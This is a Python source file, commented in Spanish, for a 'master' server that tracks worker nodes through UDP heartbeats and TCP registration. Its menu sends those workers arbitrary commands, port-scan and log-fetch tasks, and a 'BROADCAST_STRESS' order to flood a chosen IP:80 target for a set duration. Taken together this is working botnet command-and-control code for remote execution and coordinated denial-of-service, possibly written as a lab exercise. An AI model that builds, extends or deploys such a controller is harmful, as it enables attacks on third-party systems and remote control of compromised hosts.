import socket, threading, time, sys

# Configuración del servidor central con la IP proporcionada
HOST, UDP_PORT, TCP_PORT = "192.168.1.6", 5000, 5001
active_workers, workers_lock = {}, threading.Lock()

def udp_heartbeat_listener():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((HOST, UDP_PORT))
    while True:
        try:
            data, addr = sock.recvfrom(1024)
            msg = data.decode()
            if msg.startswith("PING:"):
                parts = msg[5:].split(" ")
                if len(parts) >= 3:
                    node_id, cpu, status = parts[0], parts[1], parts[2]
                    with workers_lock:
                        active_workers[node_id] = {
                            'ip': addr[0], 
                            'last_seen': time.time(), 
                            'cpu': cpu, 
                            'status': status, 
                            'conn': active_workers.get(node_id, {}).get('conn')
                        }
                    sock.sendto(b"ACK", addr)
        except: 
            pass

def monitor_dead_workers():
    while True:
        time.sleep(2)
        cur = time.time()
        with workers_lock:
            to_remove = [n_id for n_id, info in active_workers.items() if cur - info['last_seen'] > 6]
            for n_id in to_remove:
                print(f"\n[ALERTA] Worker '{n_id}' CAÍDO (Sin latidos)")
                if active_workers[n_id].get('conn'):
                    try: 
                        active_workers[n_id]['conn'].close()
                    except: 
                        pass
                del active_workers[n_id]

def handle_tcp_worker(conn, addr):
    try:
        while data := conn.recv(1024): 
            print(f"\n[TCP Respuesta de {addr}] {data.decode()}")
    except: 
        pass
    finally:
        conn.close()
        with workers_lock:
            for n_id, info in list(active_workers.items()):
                if info['ip'] == addr[0] and info.get('conn') == conn:
                    active_workers[n_id]['conn'] = None
                    print(f"\n[TCP] Sesión cerrada para el worker {n_id}")
                    break

def tcp_server_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, TCP_PORT))
    server.listen(5)
    while True:
        conn, addr = server.accept()
        try:
            init_msg = conn.recv(1024).decode()
            if init_msg.startswith("REGISTER:"):
                node_id = init_msg.split(":")[1].strip()
                with workers_lock:
                    if node_id in active_workers: 
                        active_workers[node_id]['conn'] = conn
                    else: 
                        active_workers[node_id] = {
                            'ip': addr[0], 
                            'last_seen': time.time(), 
                            'cpu': '0%', 
                            'status': 'REGISTERED', 
                            'conn': conn
                        }
                print(f"\n[TCP] Conectado con Worker: {node_id}")
            threading.Thread(target=handle_tcp_worker, args=(conn, addr), daemon=True).start()
        except: 
            conn.close()

def master_cli():
    time.sleep(1)
    while True:
        print("\n--- MENÚ MASTER ---")
        print("1. Listar workers")
        print("2. Enviar comando (EXEC_TASK)")
        print("3. Lanzar ráfaga (BROADCAST_STRESS)")
        print("4. Salir")
        choice = input("Opción: ").strip()
        
        if choice == '1':
            with workers_lock:
                if not active_workers:
                    print("[INFO] No hay workers activos registrados.")
                for n_id, info in active_workers.items(): 
                    print(f"ID: {n_id} | IP: {info['ip']} | CPU: {info['cpu']} | TCP: {bool(info['conn'])}")
        
        elif choice == '2':
            n_id = input("ID del Worker: ").strip()
            print("\nComandos preestablecidos disponibles:")
            print("  1) scan_ports")
            print("  2) FETCH_LOGS")
            sub = input("Selecciona una opción (1 o 2) o escribe un comando personalizado: ").strip()
            
            if sub == '1':
                task = "scan_ports"
            elif sub == '2':
                task = "FETCH_LOGS"
            else:
                task = sub

            with workers_lock:
                if n_id in active_workers and active_workers[n_id]['conn']:
                    active_workers[n_id]['conn'].sendall(f"EXEC_TASK:{task}".encode())
                    print("[TCP] Comando enviado con éxito.")
                else:
                    print("[Error] Worker no encontrado o sin sesión TCP activa.")
        
        elif choice == '3':
            target = input("Objetivo IP:80: ").strip()
            duration = input("Duración(s): ").strip()
            msg = f"BROADCAST_STRESS:{target}:{duration}"
            count = 0
            with workers_lock:
                for info in active_workers.values():
                    if info['conn']: 
                        info['conn'].sendall(msg.encode())
                        count += 1
            print(f"[TCP] Broadcast de estrés enviado a {count} workers.")
        
        elif choice == '4': 
            sys.exit(0)

if __name__ == '__main__':
    [threading.Thread(target=t, daemon=True).start() for t in (udp_heartbeat_listener, monitor_dead_workers, tcp_server_listener)]
    master_cli()